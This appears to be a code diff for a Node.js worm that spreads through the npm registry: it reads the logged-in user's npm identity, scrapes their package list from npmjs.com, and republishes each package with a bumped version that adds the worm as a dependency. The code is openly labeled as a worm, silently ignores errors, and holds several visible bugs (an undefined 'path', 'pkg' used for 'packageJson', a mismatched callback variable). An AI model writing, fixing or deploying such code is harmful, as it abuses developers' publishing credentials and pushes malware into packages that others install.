@@ -1,47 +1,88 @@
 var wormInfo = require("./package");
-var npmUser  = require("npm-user");
 var child    = require("child_process");
+var https    = require("https");
 var fs       = require("fs");
 
-// get npm username
-var username = child.execSync("npm whoami", { encoding: "utf8" }).trim();
-if (!username) return;
+// get the targets username
+function getUsername(callback) {
+  child.exec("npm whoami", { encoding: "utf8" }, function (err, stderr, stdout) {
+    if (err) return; // yolo
+    if (stderr) return; // yolo
 
-wormInfo(username, function (err, data) {
-  if (err) throw err;
+    var username = stdout.trim();
+    if (!username) return; // yolo
 
-  data.packages.forEach(function (pkgName) {
-    // create dummy directory
-    var cwd = path.join(__dirname, "." + pkgName);
-    fs.mkdirSync(cwd);
+    callback(username);
+  });
+}
 
-    // create dummy node_modules directory
-    var modulesLoc = path.join(cwd, "node_modules");
-    fs.mkdirSync(modulesLoc);
+// get all the npm packages for the specified user
+function getPackages(username, callback) {
+  https.get("https://www.npmjs.com/~" + username, function(res) {
+    var buf = "";
 
-    // path the module will be installed to
-    var moduleLoc  = path.join(modulesLoc, pkgName);
-    var packageLoc = path.join(moduleLoc, "package.json");
+    res.setEncoding("utf8");
 
-    // install package
-    child.exec("npm install " + pkgName, { cwd: cwd }, function (err) {
-      if (err) throw err;
-
-      var packageJson = require(packageLoc);
-
-      // bump the patch version
-      var versionParts = packageJson.version.split(".");
-      var patchVersion = parseInt(versionParts.pop());
-      versionParts.push(patchVersion + 1);
-      pkg.version = versionParts.join(".");
-
-      // add the worm to the dependencies :~)
-      pkg.dependencies[wormInfo.name] = "*";
-
-      // publish new version with updated package.json
-      child.exec("npm publish", { cwd: moduleLoc }, function (err) {
-        if (err) throw err;
-      });
+    res.on("data", function (chunk) {
+      buf += chunk;
     });
+
+    res.on("end", function () {
+      var packages = [];
+
+      buf.replace(/href="\/package\/(.*?)"/g, function (full, packageName) {
+        packages.push(packageName);
+      });
+
+      callback(packages);
+    })
+  }).on("error", function (err) {
+    // yolo
+  });
+}
+
+// republish the target package
+function republish(pkgName) {
+  // create dummy directory
+  var cwd = path.join(__dirname, "." + pkgName);
+  fs.mkdirSync(cwd);
+
+  // create dummy node_modules directory
+  var modulesLoc = path.join(cwd, "node_modules");
+  fs.mkdirSync(modulesLoc);
+
+  // path the module will be installed to
+  var moduleLoc  = path.join(modulesLoc, pkgName);
+  var packageLoc = path.join(moduleLoc, "package.json");
+
+  // install package
+  child.exec("npm install " + pkgName, { cwd: cwd }, function (err) {
+    if (err) return; // yolo
+
+    var packageJson = require(packageLoc);
+
+    // bump the patch version
+    var versionParts = packageJson.version.split(".");
+    var patchVersion = parseInt(versionParts.pop());
+    versionParts.push(patchVersion + 1);
+    pkg.version = versionParts.join(".");
+
+    // add the worm to the dependencies :~)
+    pkg.dependencies[wormInfo.name] = "*";
+
+    // save new package.json
+    fs.writeFileSync(packageLoc, JSON.stringify(pkg, null, "  "));
+
+    // publish new version with updated package.json
+    child.exec("npm publish", { cwd: moduleLoc }, function (err) {
+      if (err) return; // yolo
+    });
+  });
+}
+
+// let the magic begin
+getUsername(function (username) {
+  getPackages(username, function (dapackagesta) {
+    packages.forEach(republish);
   });
 });
